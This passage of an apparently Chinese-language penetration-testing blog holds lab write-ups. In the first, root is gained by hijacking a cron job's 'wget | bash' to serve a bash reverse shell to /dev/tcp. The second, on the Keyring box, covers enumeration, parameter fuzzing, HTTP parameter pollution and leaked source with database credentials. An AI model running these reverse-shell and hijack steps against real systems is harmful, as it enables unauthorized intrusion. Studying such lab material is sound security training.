<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>su - listen</span><br><span class="line"><span class="symbol">Password:</span> </span><br><span class="line">listen<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>成功切换到listen<br>有一个文件 ，而且用pspy64发现root会定时执行这个listentome.sh </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">listen</span>@listen:~$ ls</span><br><span class="line"><span class="attribute">listentome</span>.sh  password.txt  user.txt</span><br><span class="line"><span class="attribute">listen</span>@listen:~$ cat listentome.sh </span><br><span class="line"><span class="attribute">wget</span> -O - -q http://listen/ihearyou.sh | bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">07</span> <span class="number">22</span>:<span class="number">14</span>:<span class="number">02</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1070</span>   | sh /home/listen/listentome.sh </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">07</span> <span class="number">22</span>:<span class="number">14</span>:<span class="number">02</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1071</span>   | sh /home/listen/listentome.sh </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这个马上就有思路了，修改host，把listen指向我们本机的http服务，把反弹shell的sh文件让靶机执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">127.0.0.1</span>       localhost</span><br><span class="line"><span class="number">192.168.179.11</span>  listen</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::<span class="number">1</span>     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::<span class="number">1</span> ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span> ip6-allrouters</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ctrl + o 回车 ctrl + x</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># rm ihearyou.sh         </span></span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># touch ihearyou.sh</span></span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># cp reverse.sh ihearyou.sh</span></span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># cat ihearyou.sh          </span></span><br><span class="line">bash -i &gt;&amp; <span class="string">/dev/tcp/192.168.179.11/1234</span> 0&gt;&amp;1</span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># python3 -m http.server 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 <span class="params">(http://0.0.0.0:80/)</span> <span class="string">...</span></span><br></pre></td></tr></table></figure>
<p>然后在另一个kali端口监听</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234             </span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process<span class="built_in"> group </span>(1123): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="literal">no</span> job control <span class="keyword">in</span> this shell</span><br><span class="line">root@listen:~# id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br><span class="line">root@listen:~# </span><br></pre></td></tr></table></figure></div>
<p>完成</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>IA: Keyring</title>
    <url>/posts/8393.html</url>
    <content><![CDATA[<p>vulnhub-IA: Keyring靶场复盘</p>
<span id="more"></span>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.230</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">06</span> <span class="number">18</span>:<span class="number">38</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.230</span> (<span class="number">192.168</span>.<span class="number">240.230</span>)</span><br><span class="line">Host is up (<span class="number">0.0020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">8</span>d:eb:fd:<span class="number">0</span>a:<span class="number">76</span>:<span class="number">8</span>a:<span class="number">2</span>a:<span class="number">75</span>:<span class="number">6</span>e:<span class="number">9</span>b:<span class="number">6</span>e:<span class="number">7</span>b:<span class="number">51</span>:c4:<span class="number">28</span>:db (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">53</span>:<span class="number">31</span>:<span class="number">35</span>:c0:<span class="number">3</span>a:a0:<span class="number">48</span>:<span class="number">2</span>f:<span class="number">3</span>a:<span class="number">79</span>:f5:<span class="number">56</span>:cd:<span class="number">3</span>c:<span class="number">63</span>:ee (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">8</span>d:<span class="number">7</span>b:d3:c9:<span class="number">15</span>:<span class="number">61</span>:<span class="number">03</span>:b1:b5:f1:d2:ed:<span class="number">2</span>c:<span class="number">01</span>:<span class="number">55</span>:<span class="number">65</span> (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">29</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span>).</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.29</span> (Ubuntu)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">96</span>:BA:A0:CE:<span class="number">70</span>:B8 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">3</span>.X|<span class="number">4</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">3</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">3.2</span> <span class="operator">-</span> <span class="number">4.14</span></span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.01</span> ms <span class="number">192.168</span>.<span class="number">240.230</span> (<span class="number">192.168</span>.<span class="number">240.230</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.97</span> seconds</span><br></pre></td></tr></table></figure></div>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>访问80端口： 是一个登录界面<br><img src="https://pic1.imgdb.cn/item/67a4c69dd0e0a243d4fc53cd.png"><br>目录扫描也发现真正的登录界面在login.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u 192.168.240.230         </span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/tmp/reports/_192.168.240.230/_25-02-06_18-40-23.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.230</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">23</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span>                                    </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.html</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">25</span>] <span class="number">302</span> <span class="operator">-</span>  <span class="number">561</span>B  <span class="operator">-</span> <span class="symbol">/about.php</span>  <span class="operator">-&gt;</span>  index.php                         </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">28</span>] <span class="number">302</span> <span class="operator">-</span>  <span class="number">561</span>B  <span class="operator">-</span> <span class="symbol">/control.php</span>  <span class="operator">-&gt;</span>  index.php                       </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">30</span>] <span class="number">302</span> <span class="operator">-</span>  <span class="number">561</span>B  <span class="operator">-</span> <span class="symbol">/home.php</span>  <span class="operator">-&gt;</span>  index.php                          </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">31</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">746</span>B  <span class="operator">-</span> <span class="symbol">/login.php</span>                                        </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">31</span>] <span class="number">302</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/logout.php</span>  <span class="operator">-&gt;</span>  index.php                        </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">34</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">34</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67a4c69dd0e0a243d4fc53ce.png"><br>尝试用bp爆破一下密码 但是爆破不出来<br>继续返回主界面，发现这里竟然也可以注册，自己输入账号密码创建一个用户，然后登录<br><img src="https://pic1.imgdb.cn/item/67a4c69ed0e0a243d4fc53cf.png"><br>页面提醒内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">HTTP Parameter Pollution <span class="keyword">or</span> HPP <span class="keyword">in</span> short <span class="keyword">is</span> a vulnerability that occurs</span><br><span class="line">due <span class="keyword">to</span> <span class="keyword">passing</span> <span class="keyword">of</span> multiple parameters <span class="keyword">having</span> same <span class="type">name</span></span><br></pre></td></tr></table></figure></div>
<p>告诉我们有http参数污染漏洞，所以尝试用wfuzz跑参数 但是我没有成功 对wfuzz不是很熟悉<br>去看了下群主的视频，我的思路是没有问题的，也确实是用wfuzz，就是我用这个工具没用对<br>而且需要去网页里面得到cookie. 并且目录没有扫全，以后都用gobuster跑目录了。。。<br><img src="https://pic1.imgdb.cn/item/67a4c69fd0e0a243d4fc53d0.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># gobuster dir -u 192.168.240.230 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -x .php,.txt,.html -t 50</span></span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Gobuster v3.<span class="number">6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Url:</span>                     http:<span class="symbol">//192.168.240.230</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Method:</span>                  GET</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Threads:</span>                 <span class="number">50</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Wordlist:</span>                <span class="symbol">/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span></span><br><span class="line">[<span class="operator">+</span>] Negative Status <span class="params">codes:</span>   <span class="number">404</span></span><br><span class="line">[<span class="operator">+</span>] User <span class="params">Agent:</span>              gobuster<span class="symbol">/3.6</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Extensions:</span>              php,txt,html</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Timeout:</span>                 <span class="number">10</span>s</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line"><span class="symbol">/home.php</span>             (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">561</span>] [-<span class="operator">-&gt;</span> index.php]</span><br><span class="line"><span class="symbol">/login.php</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">1466</span>]</span><br><span class="line"><span class="symbol">/history.php</span>          (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">31</span>]</span><br><span class="line"><span class="symbol">/.html</span>                (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.php</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/about.php</span>            (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">561</span>] [-<span class="operator">-&gt;</span> index.php]</span><br><span class="line"><span class="symbol">/index.php</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">3254</span>]</span><br><span class="line"><span class="symbol">/logout.php</span>           (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">0</span>] [-<span class="operator">-&gt;</span> index.php]</span><br><span class="line"><span class="symbol">/control.php</span>          (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">561</span>] [-<span class="operator">-&gt;</span> index.php]</span><br></pre></td></tr></table></figure></div>
<p>这里的history是页面上没有显示内容的，所以大概率用这个路径<br>先去安装一下seclists字典 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# apt <span class="keyword">update</span></span><br><span class="line">Ge<span class="variable">t:1</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling InRelease [<span class="number">41.5</span> kB]</span><br><span class="line">Ge<span class="variable">t:2</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/main arm64 Packages [<span class="number">20.2</span> MB]</span><br><span class="line">Ge<span class="variable">t:3</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/main arm64 Contents (<span class="keyword">deb</span>) [<span class="number">47.9</span> MB]</span><br><span class="line">Ge<span class="variable">t:4</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/non-free arm64 Packages [<span class="number">148</span> kB]                                </span><br><span class="line">Ge<span class="variable">t:5</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/non-free arm64 Contents (<span class="keyword">deb</span>) [<span class="number">825</span> kB]                          </span><br><span class="line">Ge<span class="variable">t:6</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/contrib arm64 Packages [<span class="number">97.3</span> kB]                                </span><br><span class="line">Ge<span class="variable">t:7</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/contrib arm64 Contents (<span class="keyword">deb</span>) [<span class="number">179</span> kB]                           </span><br><span class="line">Fetched <span class="number">69.4</span> MB in <span class="number">13</span>s (<span class="number">5</span>,<span class="number">413</span> kB/s)                                                                               </span><br><span class="line"><span class="number">681</span> packages can <span class="keyword">be</span> upgraded. Run <span class="string">&#x27;apt list --upgradable&#x27;</span> <span class="keyword">to</span> see them.</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# apt install seclists</span><br></pre></td></tr></table></figure></div>
<p>然后用wfuzz进行模糊参数名 扫出user</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.240.230/history.php?FUZZ=kakeru -H &#x27;Cookie: PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&#x27; --hh 0</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.240.230/history.php?FUZZ=kakeru</span><br><span class="line">Total requests: 4734</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                           </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000004339:   200        0 L      5 W        85 Ch       &quot;user&quot;                                            </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 4734</span><br><span class="line">Filtered Requests: 4733</span><br><span class="line">Requests/sec.: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后用这个参数污染漏洞访问admin的历史记录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://<span class="number">192.168</span>.<span class="number">240.230</span>/<span class="keyword">history</span>.php?user=admin -H <span class="string">&quot;Cookie: PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span></span><br><span class="line">Pages visited by user admin<span class="symbol">&lt;br&gt;</span><span class="symbol">&lt;br&gt;</span>https://github.<span class="keyword">com</span>/cyberbot75/keyring<span class="symbol">&lt;br&gt;</span><span class="symbol">&lt;br&gt;</span>    </span><br><span class="line">                                                             </span><br></pre></td></tr></table></figure></div>
<p>有github源码泄漏<br>在control.php中发现有一个注释，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;sqluserrootpassw0r4&quot;</span>;</span><br><span class="line">	<span class="variable">$database</span> = <span class="string">&quot;users&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$date</span> =  <span class="title function_ 